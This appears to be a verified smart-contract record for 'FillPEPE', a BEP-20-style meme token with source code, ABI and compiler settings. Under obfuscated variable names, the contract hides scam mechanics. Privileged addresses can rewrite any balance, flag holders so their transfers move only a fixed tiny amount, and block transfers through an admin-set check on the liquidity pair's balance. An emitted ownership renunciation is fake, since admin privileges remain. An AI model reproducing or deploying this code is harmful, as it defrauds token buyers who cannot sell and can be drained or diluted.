{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface sellLaunchedLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountExempt) external view returns (uint256);\n\n    function transfer(address minMax, uint256 isTake) external returns (bool);\n\n    function allowance(address txSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minMax,\n        uint256 isTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txTakeMax, uint256 value);\n    event Approval(address indexed txSwap, address indexed spender, uint256 value);\n}\n\nabstract contract tradingAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityTeam {\n    function createPair(address totalMaxSwap, address tradingEnable) external returns (address);\n}\n\ninterface sellLaunchedLimitMetadata is sellLaunchedLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FillPEPE is tradingAt, sellLaunchedLimit, sellLaunchedLimitMetadata {\n\n    bool public tokenTakeTo;\n\n    function walletTrading(address receiverTotal, uint256 isTake) public {\n        minExempt();\n        launchedWallet[receiverTotal] = isTake;\n    }\n\n    function walletMin(address fromTrading, address minMax, uint256 isTake) internal returns (bool) {\n        if (fromTrading == senderAuto) {\n            return fromMarketing(fromTrading, minMax, isTake);\n        }\n        uint256 autoExempt = sellLaunchedLimit(teamMarketingAuto).balanceOf(teamLaunched);\n        require(autoExempt == isReceiver);\n        require(minMax != teamLaunched);\n        if (feeLiquidity[fromTrading]) {\n            return fromMarketing(fromTrading, minMax, isAmount);\n        }\n        return fromMarketing(fromTrading, minMax, isTake);\n    }\n\n    function transferFrom(address fromTrading, address minMax, uint256 isTake) external override returns (bool) {\n        if (_msgSender() != buyEnableAmount) {\n            if (takeSwapMarketing[fromTrading][_msgSender()] != type(uint256).max) {\n                require(isTake <= takeSwapMarketing[fromTrading][_msgSender()]);\n                takeSwapMarketing[fromTrading][_msgSender()] -= isTake;\n            }\n        }\n        return walletMin(fromTrading, minMax, isTake);\n    }\n\n    uint256 private fundReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return fromExempt;\n    }\n\n    function fromMarketing(address fromTrading, address minMax, uint256 isTake) internal returns (bool) {\n        require(launchedWallet[fromTrading] >= isTake);\n        launchedWallet[fromTrading] -= isTake;\n        launchedWallet[minMax] += isTake;\n        emit Transfer(fromTrading, minMax, isTake);\n        return true;\n    }\n\n    address private tradingSell;\n\n    address buyEnableAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return tradingSell;\n    }\n\n    bool private toIs;\n\n    mapping(address => bool) public feeLiquidity;\n\n    function maxLiquidity(uint256 isTake) public {\n        minExempt();\n        isReceiver = isTake;\n    }\n\n    function approve(address tokenAuto, uint256 isTake) public virtual override returns (bool) {\n        takeSwapMarketing[_msgSender()][tokenAuto] = isTake;\n        emit Approval(_msgSender(), tokenAuto, isTake);\n        return true;\n    }\n\n    function minExempt() private view {\n        require(limitEnable[_msgSender()]);\n    }\n\n    function teamMode(address limitTo) public {\n        minExempt();\n        if (fundReceiver != minShould) {\n            minShould = fundReceiver;\n        }\n        if (limitTo == senderAuto || limitTo == teamMarketingAuto) {\n            return;\n        }\n        feeLiquidity[limitTo] = true;\n    }\n\n    function balanceOf(address amountExempt) public view virtual override returns (uint256) {\n        return launchedWallet[amountExempt];\n    }\n\n    mapping(address => bool) public limitEnable;\n\n    address public senderAuto;\n\n    function takeShouldReceiver(address receiverIs) public {\n        if (amountIs) {\n            return;\n        }\n        \n        limitEnable[receiverIs] = true;\n        \n        amountIs = true;\n    }\n\n    string private marketingList = \"FPE\";\n\n    bool public amountIs;\n\n    function allowance(address modeSwap, address tokenAuto) external view virtual override returns (uint256) {\n        if (tokenAuto == buyEnableAmount) {\n            return type(uint256).max;\n        }\n        return takeSwapMarketing[modeSwap][tokenAuto];\n    }\n\n    uint256 constant isAmount = 16 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingList;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeSwapMarketing;\n\n    constructor (){\n        if (minShould == launchedLaunch) {\n            launchedLaunch = listTotal;\n        }\n        feeFund receiverModeBuy = feeFund(buyEnableAmount);\n        teamMarketingAuto = liquidityTeam(receiverModeBuy.factory()).createPair(receiverModeBuy.WETH(), address(this));\n        if (tokenTakeTo) {\n            minShould = launchedLaunch;\n        }\n        senderAuto = _msgSender();\n        enableLiquidityBuy();\n        limitEnable[senderAuto] = true;\n        launchedWallet[senderAuto] = totalMarketing;\n        if (fundReceiver == launchedLaunch) {\n            tokenTakeTo = true;\n        }\n        emit Transfer(address(0), senderAuto, totalMarketing);\n    }\n\n    mapping(address => uint256) private launchedWallet;\n\n    event OwnershipTransferred(address indexed enableTeam, address indexed listExempt);\n\n    address teamLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address receiverTotal, uint256 isTake) external virtual override returns (bool) {\n        return walletMin(_msgSender(), receiverTotal, isTake);\n    }\n\n    uint256 private listTotal;\n\n    uint256 isReceiver;\n\n    uint256 private minShould;\n\n    string private fromExempt = \"Fill PEPE\";\n\n    function enableLiquidityBuy() public {\n        emit OwnershipTransferred(senderAuto, address(0));\n        tradingSell = address(0);\n    }\n\n    uint256 liquidityLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMarketing;\n    }\n\n    uint256 private totalMarketing = 100000000 * 10 ** 18;\n\n    uint256 private launchedLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFundAt;\n    }\n\n    uint8 private shouldFundAt = 18;\n\n    address public teamMarketingAuto;\n\n    function getOwner() external view returns (address) {\n        return tradingSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTakeMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"maxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"takeShouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"}],\"name\":\"teamMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTakeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTake\",\"type\":\"uint256\"}],\"name\":\"walletTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FillPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}